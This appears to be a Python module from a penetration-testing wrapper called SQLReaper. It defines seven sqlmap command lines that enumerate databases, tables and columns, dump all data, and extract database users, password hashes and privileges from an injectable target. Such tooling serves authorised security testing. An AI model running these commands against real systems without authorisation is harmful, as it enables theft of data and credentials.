"""Dump module for SQLReaper — 7 commands."""
from __future__ import annotations

from typing import Dict, List

from core.config import ScanConfig
from core.builder import base_flags
from utils.banner import YELLOW


def get_commands(cfg: ScanConfig) -> List[Dict]:
    """Return dump/enumeration command definitions.

    Args:
        cfg: Resolved scan configuration.

    Returns:
        List of command definition dicts.
    """
    b = base_flags(cfg)
    db = ["-D", cfg.database] if cfg.database else []
    return [
        {
            "label": "Enumerate All Databases",
            "tag": "DUMP",
            "tag_color": YELLOW,
            "cmd": ["sqlmap"] + b + ["--dbs"],
        },
        {
            "label": "Enumerate Tables",
            "tag": "DUMP",
            "tag_color": YELLOW,
            "cmd": ["sqlmap"] + b + db + ["--tables"],
        },
        {
            "label": "Enumerate Columns",
            "tag": "DUMP",
            "tag_color": YELLOW,
            "cmd": ["sqlmap"] + b + db + ["--columns"],
        },
        {
            "label": "Dump All Data (exclude system DBs)",
            "tag": "DUMP",
            "tag_color": YELLOW,
            "cmd": ["sqlmap"] + b + db + ["--dump-all", "--exclude-sysdbs"],
        },
        {
            "label": "Extract DB Users",
            "tag": "DUMP",
            "tag_color": YELLOW,
            "cmd": ["sqlmap"] + b + ["--users"],
        },
        {
            "label": "Extract DB Password Hashes",
            "tag": "DUMP",
            "tag_color": YELLOW,
            "cmd": ["sqlmap"] + b + ["--passwords"],
        },
        {
            "label": "Extract DB Privileges",
            "tag": "DUMP",
            "tag_color": YELLOW,
            "cmd": ["sqlmap"] + b + ["--privileges"],
        },
    ]
